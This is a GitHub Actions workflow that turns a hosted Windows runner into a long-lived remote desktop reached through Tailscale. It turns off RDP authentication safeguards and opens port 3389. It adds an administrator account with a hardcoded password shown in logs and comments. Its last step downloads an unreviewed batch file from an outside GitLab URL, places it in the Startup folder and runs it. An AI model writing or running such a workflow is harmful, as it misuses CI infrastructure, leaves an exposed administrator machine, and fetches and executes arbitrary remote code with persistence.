name: "FAISAL JAVED | IDEAL-TECH | Windows RDP"

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    name: "FAISAL JAVED | @IDEAL-TECH RDP"
    runs-on: windows-2022
    timeout-minutes: 350

    steps:
      - name: Configure Core RDP Settings
        run: |
          # ORIGINAL RDP SETTINGS - kept as in the user's working workflow.
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                             -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "SecurityLayer" -Value 0 -Force

          # Keep the original netsh firewall commands; do not use New-NetFirewallRule here.
          netsh advfirewall firewall delete rule name="RDP-Tailscale"

          # Original testing rule: allow incoming TCP 3389.
          netsh advfirewall firewall add rule name="RDP-Tailscale" `
            dir=in action=allow protocol=TCP localport=3389

          # Original service restart.
          Restart-Service -Name TermService -Force

      - name: Create IDEAL-TECH RDP User
        run: |
          $username = "RDP"
          $password = "faisaljvd"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force

          if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
              New-LocalUser -Name $username -Password $securePass -AccountNeverExpires `
                -Description "Faisal Javed | @IDEAL-TECH"
          } else {
              Set-LocalUser -Name $username -Password $securePass
          }

          Add-LocalGroupMember -Group "Administrators" -Member $username -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username -ErrorAction SilentlyContinue

          "RDP_CREDS=User: $username | Password: $password" >> $env:GITHUB_ENV

          if (-not (Get-LocalUser -Name $username)) {
              Write-Error "RDP user creation failed"
              exit 1
          }

          Write-Host "RDP user configured: Faisal Javed | @IDEAL-TECH"

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"

          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force

      - name: Establish Tailscale Connection
        run: |
          # Original Tailscale connection, with IDEAL-TECH hostname branding.
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up `
            --authkey=${{ secrets.TAILSCALE_AUTHKEY }} `
            --hostname=ideal-tech-faisal-$env:GITHUB_RUN_ID

          # Wait for Tailscale to assign an IP.
          $tsIP = $null
          $retries = 0

          while (-not $tsIP -and $retries -lt 10) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              Start-Sleep -Seconds 5
              $retries++
          }

          if (-not $tsIP) {
              Write-Error "Tailscale IP not assigned. Exiting."
              exit 1
          }

          "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV

      - name: Verify RDP Accessibility
        run: |
          Write-Host ""
          Write-Host "=========================================="
          Write-Host "       FAISAL JAVED | @IDEAL-TECH"
          Write-Host "=========================================="
          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
          Write-Host "Testing RDP TCP port 3389..."

          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389

          if (-not $testResult.TcpTestSucceeded) {
              Write-Error "TCP connection to RDP port 3389 failed"
              exit 1
          }

          Write-Host "TCP connectivity successful!"

      - name: Maintain Connection + Watch RDP User
        run: |
          Write-Host ""
          Write-Host "================================================"
          Write-Host "          FAISAL JAVED | @IDEAL-TECH"
          Write-Host "================================================"
          Write-Host "          WINDOWS REMOTE DESKTOP"
          Write-Host "------------------------------------------------"
          Write-Host "Owner    : Faisal Javed"
          Write-Host "Brand    : @IDEAL-TECH"
          Write-Host "Address  : $env:TAILSCALE_IP"
          Write-Host "Username : RDP"
          Write-Host "Password : faisaljvd"
          Write-Host "------------------------------------------------"
          Write-Host "          Powered by IDEAL-TECH"
          Write-Host "================================================"

          $rdpProfile = "C:\Users\RDP"
          $startupPath = "$rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
          $downloadUrl = "https://gitlab.com/MR.English2008/pcme_rdp/-/raw/main/Downloads.bat"
          $downloadPath = "$startupPath\Downloads.bat"

          while ($true) {
              if (Test-Path $rdpProfile) {
                  try {
                      if (-not (Test-Path $startupPath)) {
                          New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
                      }

                      Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing
                      Write-Host "Downloads.bat copied to $downloadPath"

                      # Run the batch file for the first time.
                      cmd /c $downloadPath
                      Write-Host "Downloads.bat execution completed."
                      break
                  }
                  catch {
                      Write-Host "Error copying or executing Downloads.bat: $($_.Exception.Message)"
                      break
                  }
              }
              else {
                  Write-Host "[$(Get-Date)] Waiting for RDP profile to be created..."
                  Start-Sleep -Seconds 30
              }
          }

          # Keep runner alive, as in the original workflow.
          while ($true) {
              Write-Host "[$(Get-Date)] FAISAL JAVED | @IDEAL-TECH - RDP Active"
              Start-Sleep -Seconds 300
          }

# RDP LOGIN DETAILS
# Owner: Faisal Javed
# Brand: @IDEAL-TECH
# Username: RDP
# Password: faisaljvd
# Address: TAILSCALE_IP:3389 (shown in workflow logs)
#
# REQUIRED GITHUB REPOSITORY SECRET:
# TAILSCALE_AUTHKEY
#
# SECURITY NOTE:
# This file contains the requested fixed password in plain text.
# Keep this file private. For safer use, store the password in GitHub Secrets
# and use a strong, unique password. The original firewall rule allows TCP
# port 3389 from any source; use only in a trusted/isolated test environment.
# GitHub-hosted runners are temporary and stop when the job ends or times out.
